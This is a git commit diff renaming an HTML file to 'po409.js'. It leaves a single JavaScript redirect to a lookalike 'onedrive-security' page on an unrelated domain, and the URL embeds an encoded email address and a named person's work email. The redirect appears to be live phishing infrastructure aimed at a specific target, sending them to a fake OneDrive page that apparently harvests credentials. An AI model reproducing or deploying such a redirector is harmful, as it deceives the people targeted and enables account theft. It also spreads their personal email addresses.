74f32f388dbe1b9ff51231b80814ea0484108ee9
tanjanegineering-oss <tanjanegineering@gmail.com>
2026-04-30 22:58:55 -0700

    Update and rename web.html to po409.js

--- po409.js
+++ po409.js
@@ -1,4 +1,4 @@
-	<script>
+
     window.location.assign("https://onedrive-security.aeroform-composite.com/bot/pdfs101.htm?onedrive=aWJlbndhQHFxLmNvbQ%3D%3D&_r=yZdPVI8#Daniyal.uddin@samipharma.com.pk");
-  </script>
+
 	
